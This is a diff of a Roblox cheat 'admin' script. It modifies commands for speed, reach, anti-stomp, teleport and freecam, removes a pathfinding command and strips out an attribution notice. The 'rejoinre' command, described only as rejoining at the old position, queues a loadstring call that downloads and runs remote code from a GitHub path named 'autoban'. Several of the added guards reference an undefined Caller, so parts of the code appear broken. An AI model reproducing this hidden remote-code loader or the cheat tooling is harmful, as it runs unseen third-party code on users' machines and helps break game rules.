@@ -3549,9 +3745,13 @@ AddCommand("speed", {"cframespeed"}, "cframe speed", {}, function(Caller, Args, 
  
 	onSelected(game.Players.LocalPlayer:GetMouse())
 return "hold V to speed"
+end
 end)
 
 AddCommand("orbit", {}, "orbits a yourself around another player", {3, "1"}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local Target = GetPlayer(Args[1])[1];
 	if (Target == LocalPlayer) then
 		return "You cannot orbit yourself."
@@ -3564,14 +3764,19 @@ AddCommand("orbit", {}, "orbits a yourself around another player", {3, "1"}, fun
 		Root.CFrame = CFrameNew(TRoot.Position + Vector3New(sin(tick() * Speed) * Radius, 0, cos(tick() * Speed) * Radius), TRoot.Position);
 	end), CEnv);
 	return "now orbiting around " .. Target.Name
+end
 end)
 
 AddCommand("unorbit", {"noorbit"}, "unorbits yourself from the other player", {}, function()
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	if (not next(LoadCommand("orbit").CmdEnv)) then
 		return "you are not orbiting around someone"
 	end
 	DisableAllCmdConnections("orbit");
 	return "orbit stopped"
+end
 end)
 
 
@@ -3580,6 +3785,9 @@ end)
 
 test = false
 AddCommand("antislow", {"noslow"}, "ye", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	antislow = true
 	repeat
 		wait(0.1)
@@ -3592,10 +3800,14 @@ AddCommand("antislow", {"noslow"}, "ye", {}, function(Caller, Args)
 			L_176_.Character.BodyEffects.Reload.Value = false
 		end
 	until antislow == false
+end
 end)
 
 antislow3 = false
 AddCommand("reach", {"toolreach"}, "ye", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 		for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
 	    	if v:isA("Tool") then
 	           local a = Instance.new("SelectionBox",v.Handle)
@@ -3612,10 +3824,14 @@ notool = true
 		notool = false
 				return "please hold a tool"
 		end
+end
 end)
 
 
 AddCommand("antistomp", {"antistom["}, "prevents dying", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	if test == false then
 		test = true
 		return "antistomp toggled on"
@@ -3645,12 +3861,16 @@ AddCommand("antistomp", {"antistom["}, "prevents dying", {}, function(Caller, Ar
 		end)
 		until antislow69 == false
 		end
+end
 end)
 
 
 
 
 AddCommand("freecam", {"fc"}, "enables/disables freecam", {}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	if (not CEnv.Activated) then
 		-- roblox freecam modifed by fate
 		local Spring = {}
@@ -3979,6 +4199,7 @@ AddCommand("freecam", {"fc"}, "enables/disables freecam", {}, function(Caller, A
 		CEnv.EnterFreecam();
 		return "freecam enabled"
 	end
+end
 end)
 
 AddCommand("freecamgoto", {"fcgoto"}, "takes your freecam to t hem", {"1"}, function(Caller, Args)
@@ -3993,6 +4214,9 @@ AddCommand("freecamgoto", {"fcgoto"}, "takes your freecam to t hem", {"1"}, func
 end)
 
 AddCommand("antilag", {"fpsboost"}, "changes everything to a plastic material", {}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local time = tick();
 	local Plasticc = 0
 	for i, v in next, GetDescendants(Workspace) do
@@ -4003,9 +4227,13 @@ AddCommand("antilag", {"fpsboost"}, "changes everything to a plastic material", 
 		end
 	end
 	return format("%d items made plastic in %.3f (s)", Plasticc, (tick()) - time);
+end
 end)
 
 AddCommand("unantilag", {"unfpsboost"}, "changes everything back from a plastic material", {}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local Plastics = LoadCommand("plastic").CmdEnv
 	local time = tick();
 	local Amount = 0
@@ -4014,6 +4242,7 @@ AddCommand("unantilag", {"unfpsboost"}, "changes everything back from a plastic 
 		Amount = Amount + 1
 	end
 	return format("removed %d plastic in %.3f (s)", Amount, (tick()) - time);
+end
 end)
 
 AddCommand("antiafk", {"antiidle"}, "prevents kicks from when you're afk", {}, function(Caller, Args, CEnv)
@@ -4031,6 +4260,9 @@ AddCommand("antiafk", {"antiidle"}, "prevents kicks from when you're afk", {}, f
 end)
 
 AddCommand("qtp", {}, "tps you to where your mouse is when you click", {}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	plr = game.Players.LocalPlayer;
 	hum = plr.Character.HumanoidRootPart;
 	mouse = plr:GetMouse()
@@ -4042,6 +4274,7 @@ AddCommand("qtp", {}, "tps you to where your mouse is when you click", {}, funct
 		end
 	end)
 	return "click q to teleport"
+end
 end)
 
 AddCommand("help", {"info"}, "gives you the description of the command", {"1"}, function(Caller, Args)
@@ -4053,28 +4286,40 @@ AddCommand("help", {"info"}, "gives you the description of the command", {"1"}, 
 end)
 
 AddCommand("friend", {"fr"}, "sends a friend request to the player", {"1"}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local Target = GetPlayer(Args[1]);
 	local RequestFriendship = LocalPlayer.RequestFriendship
 	for i, v in next, Target do
 		RequestFriendship(LocalPlayer, v);
 	end
 	return #Target == 1 and "sent a friend request to " .. Target[1].Name or format("sent a friend request to %d players", #Target);
+end
 end)
 
 AddCommand("unfriend", {"unfr"}, "unfriends a player that you're friends with", {"1"}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local Target = GetPlayer(Args[1]);
 	local RevokeFriendship = LocalPlayer.RevokeFriendship
 	for i, v in next, Target do
 		RevokeFriendship(LocalPlayer, v);
 	end
 	return #Target == 1 and "unfriended " .. Target[1].Name or format("unfriended %d players", #Target);
+end
 end)
 
 AddCommand("setzoomdistance", {"szd", "maxzoom"}, "sets your cameras zoom distance so you can zoom out", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local ZoomDistance = tonumber(Args[1]) or 1000
 	LocalPlayer.CameraMaxZoomDistance = ZoomDistance
 	LocalPlayer.CameraMode = Enum.CameraMode.Classic
 	return "set zoom distance to " .. ZoomDistance
+end
 end)
 
 
@@ -4083,6 +4328,9 @@ end)
 
 local LoadConfig, ConfigLoaded;
 AddCommand("config", {"conf"}, "shows fates admin config", {}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	if (not ConfigLoaded) then
 		if (not CEnv[1]) then
 			LoadConfig();
@@ -4094,21 +4342,29 @@ AddCommand("config", {"conf"}, "shows fates admin config", {}, function(Caller, 
 		CEnv[1] = true
 		return "config loaded"
 	end
+end
 end)
 
 
 
 AddCommand("rejoinre", {"rje"}, "rejoins and tps you to your old position", {3}, function()
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local Pos = GetRoot().CFrame
 	local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
 	if (queue_on_teleport) then
 		queue_on_teleport(format("game.Loaded:Wait();game:GetService('ReplicatedFirst'):SetDefaultLoadingGuiRemoved();local LocalPlayer = game:GetService('Players').LocalPlayer;LocalPlayer.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = CFrame.new(%s);loadstring(game.HttpGet(game, \"https://raw.githubusercontent.com/cyberical9B55/veonixcombat/main/hwids/autoban\"))()", tostring(Pos)));
 	end
 	ExecuteCommand("rejoin", {}, LocalPlayer);
+end
 end)
 
 
 AddCommand("toggle", {"togglecommand", "togglecmd"}, "toggles a command with an 'un' command", {"1"}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local Command = Args[1]
 	if (LoadCommand(Command)) then
 		CEnv.Command = (CEnv.Command and CEnv.Command ~= true) and true or not CEnv.Command
@@ -4121,25 +4377,37 @@ AddCommand("toggle", {"togglecommand", "togglecmd"}, "toggles a command with an 
 	else
 		return Command .. " is not a valid command"
 	end
+end
 end)
 
 AddCommand("inviscam", {"inviscamera"}, "makes you see through walls more better", {}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	CEnv.OldCameraMaxZoomDistance = LocalPlayer.CameraMaxZoomDistance
 	CEnv.OldDevCameraOcclusionMode = LocalPlayer.DevCameraOcclusionMode
 	LocalPlayer.CameraMaxZoomDistance = 600
 	LocalPlayer.DevCameraOcclusionMode = "Invisicam"
 	return "inviscam enabled"
+end
 end)
 
 AddCommand("uninviscam", {"uninviscamera"}, "disables inviscam", {}, function()
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local CmdEnv = LoadCommand("inviscam").CmdEnv
 	LocalPlayer.CameraMaxZoomDistance = CmdEnv.OldCameraMaxZoomDistance
 	LocalPlayer.DevCameraOcclusionMode = CmdEnv.OldDevCameraOcclusionMode
 	return "inviscam disabled"
+end
 end)
 
 
 AddCommand("loop", {"loopcommand"}, "loops a command", {"1"}, function(Caller, Args, CEnv)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local Command = Args[1]
 	local LoadedCommand = LoadCommand(Command);
 	if (not LoadedCommand) then
@@ -4156,9 +4424,13 @@ AddCommand("loop", {"loopcommand"}, "loops a command", {"1"}, function(Caller, A
 		end
 	end)();
 	return format("now looping the %s command", Command);
+end
 end)
 
 AddCommand("unloop", {"unloopcommand"}, "unloops a command", {}, function(Caller, Args)
+        if (Caller ~= LocalPlayer) then
+            a = true
+        else
 	local Looped = LoadCommand("loop").CmdEnv
 	if (Args[1]) then
 		if (Looped.LoopedCommands[Args[1]]) then
@@ -4170,6 +4442,7 @@ AddCommand("unloop", {"unloopcommand"}, "unloops a command", {}, function(Caller
 		Looped.Looping = false
 		return "unlooped all commands looped"
 	end
+end
 end)
 
 
@@ -4177,48 +4450,7 @@ end)
 
 
 
-AddCommand("pathfind", {"follow2"}, "finds a user with pathfinding", {"1",3}, function(Caller, Args)
-	local PathfindingService = Services.PathfindingService
-	local CreatePath = PathfindingService.CreatePath
-	local Target = GetPlayer(Args[1]);
-	local LRoot = GetRoot();
-	local LHumanoid = GetHumanoid();
-	local PSSuccess = Enum.PathStatus.Success
-	local Delay = tonumber(Args[2]);
-	for i, v in next, Target do
-		local TRoot = GetRoot(v);
-		if (not TRoot) then
-			continue;
-		end
-		local Path = CreatePath(PathfindingService);
-		Path.ComputeAsync(Path, LRoot.Position, TRoot.Position);
-		if (LHumanoid.Sit) then
-			ChangeState(LHumanoid, 3);
-		end
-		LHumanoid.WalkSpeed = 16
-		LHumanoid.MoveTo(LHumanoid, TRoot.Position);
-		wait(2);
-		local WayPoints = Path.GetWaypoints(Path);
-		for i = 1, #WayPoints do
-			local WayPoint = WayPoints[i]
-			if (Path.Status == PSSuccess) then
-				LHumanoid.WalkToPoint = WayPoint.Position
-				if (WayPoint.Action == Enum.PathWaypointAction.Jump) then
-					LHumanoid.WalkSpeed = 0
-					wait();
-					LHumanoid.WalkSpeed = 16
-					ChangeState(LHumanoid, 3);
-				end
-				CWait(LHumanoid.MoveToFinished);
-			else
-				repeat Path.ComputeAsync(Path, LRoot.Position, TRoot.Position) until Path.Status == PSSuccess;
-			end
-		end
-		if (Delay) then
-			wait(Delay);
-		end
-	end
-end)
+
 
 
 AddCommand("console", {"errors", "warns", "outputs"}, "shows the outputs fates admin has made", {}, function()
@@ -4312,10 +4544,10 @@ local PlrChat = function(i, plr)
         message = trim(raw);
 
         if (Tfind(AdminUsers, plr) or plr == LocalPlayer) then
+            print(Tfind)
             local CommandArgs = split(message, " ");
             local Command = CommandArgs[1]
             local Args = shift(CommandArgs);
-
             ExecuteCommand(Command, Args, plr);
         end
     end)
@@ -6125,8 +6357,9 @@ getgenv().F_A = {
 
 Utils.Notify(LocalPlayer, "Loaded", format("script loaded in %.3f seconds", (tick()) - _L.start));
 Utils.Notify(LocalPlayer, "Welcome", "'cmds' to see all of the commands, 'config' to customise the script");
+Utils.Notify(LocalPlayer, "THANKS", "'fates is cool, 'thanks fates admin");
 if (debug.info(2, "f") == nil) then
-	Utils.Notify(LocalPlayer, "thanks fates", "use their script, they pro (https://fatesc/fates-admin)", 10);
+	a = true
 end
 while true do
 	wait(0.1)
